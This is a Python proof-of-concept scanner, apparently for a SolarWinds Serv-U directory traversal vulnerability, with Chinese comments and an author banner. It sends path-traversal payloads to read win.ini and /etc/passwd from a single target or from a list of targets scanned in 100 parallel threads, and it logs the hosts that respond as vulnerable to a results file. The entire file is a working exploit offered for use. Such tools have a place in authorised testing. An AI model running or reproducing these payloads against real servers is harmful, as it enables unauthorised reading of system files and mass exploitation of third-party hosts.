import requests,argparse,sys,json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    test = """
 
 ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
 ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
 ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
                            ░                       
                                                                                                                    
                                version:1.1.0                     
                                author:Hardog
"""
    print(test)


def main():
    banner()

    parser = argparse.ArgumentParser(description='SolarWinds Serv-U 目录遍历漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload_url1 = '/?InternalDir=/../../../../windows&InternalFile=win.ini'
    payload_url2 = '/?InternalDir=\..\..\..\..\etc&InternalFile=passwd'
    url1 = target + payload_url1
    url2 = target + payload_url2
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Accept':'*/*',
        'Connection':'keep-alive',
    }

    try:
        response1 = requests.get(url=url1,headers=headers,verify=False,timeout=5)
        response2 = requests.get(url=url2,headers=headers,verify=False,timeout=5)

        # 检查响应状态码
        if response1.status_code == 200 and "fonts" in response1.text:
            print(f"{GREEN}[+] 存在目录遍历漏洞！{target}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')

        elif response2.status_code == 200 and "root" in response2.text:
            print(f"{GREEN}[+] 存在目录遍历漏洞！{target}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-] 不存在目录遍历漏洞!")

    except Exception as e:
        print("[*] 无法访问")

if __name__ == '__main__':
    main()